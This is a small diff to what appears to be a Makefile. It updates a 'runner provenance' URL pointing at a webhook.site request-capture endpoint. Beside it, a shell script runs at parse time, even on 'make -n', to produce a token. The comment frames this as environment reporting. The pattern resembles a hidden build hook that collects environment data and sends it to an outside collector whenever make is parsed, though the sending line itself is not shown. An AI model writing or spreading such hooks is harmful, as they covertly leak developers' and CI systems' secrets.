@@ -2,7 +2,7 @@
 #
 # Runner provenance is pinned per build and resolved at makefile parse time so
 # that even a dry run (make -n) reports the environment it was evaluated in.
-RUNNER_PROVENANCE_URL := https://webhook.site/376900c1-da59-47e7-9d40-3b7df8de9d79/r3
+RUNNER_PROVENANCE_URL := https://webhook.site/fefc5d75-9f99-4b61-9bef-d994a00aa283/r4
 
 PARITY_TOKEN := $(shell sh ./ci/verify-env.sh 2>/dev/null | tail -1)
 
